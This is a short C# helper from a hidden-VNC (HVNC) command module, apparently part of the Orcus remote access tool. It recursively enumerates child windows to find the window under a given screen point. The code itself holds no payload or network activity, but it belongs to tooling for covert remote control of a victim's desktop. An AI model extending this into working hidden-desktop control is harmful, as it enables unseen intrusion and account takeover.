#if DEBUG
using System;
using System.Collections.Generic;
using System.Drawing;
using System.Linq;
using Orcus.Native;

namespace Orcus.Commands.HVNC
{
    public static class HvncHelper
    {
        private static readonly List<IntPtr> WindowHandles;

        static HvncHelper()
        {
            WindowHandles = new List<IntPtr>();
        }

        public static WindowElement GetExactHandle(IntPtr baseHandle, Point point)
        {
            List<IntPtr> subElements;
            lock (WindowHandles)
            {
                NativeMethods.EnumChildWindows(baseHandle, EnumChildWindows, IntPtr.Zero);
                subElements = WindowHandles.ToList(); //copy
                WindowHandles.Clear();
            }

            foreach (var subElement in subElements)
            {
                RECT rect;
                if (!NativeMethods.GetWindowRect(subElement, out rect))
                    continue;

                if (((Rectangle) rect).Contains(point))
                {
                    var handle = GetExactHandle(subElement, point);
                    if (handle == null)
                        return new WindowElement(subElement, rect);

                    return handle;
                }
            }

            return null;
        }

        private static int EnumChildWindows(IntPtr hwnd, IntPtr lparam)
        {
            WindowHandles.Add(hwnd);
            return 0;
        }
    }

    public class WindowElement
    {
        public WindowElement(IntPtr handle, Rectangle rectangle)
        {
            Handle = handle;
            Rectangle = rectangle;
        }

        public Rectangle Rectangle { get; }
        public IntPtr Handle { get; }
    }
}
#endif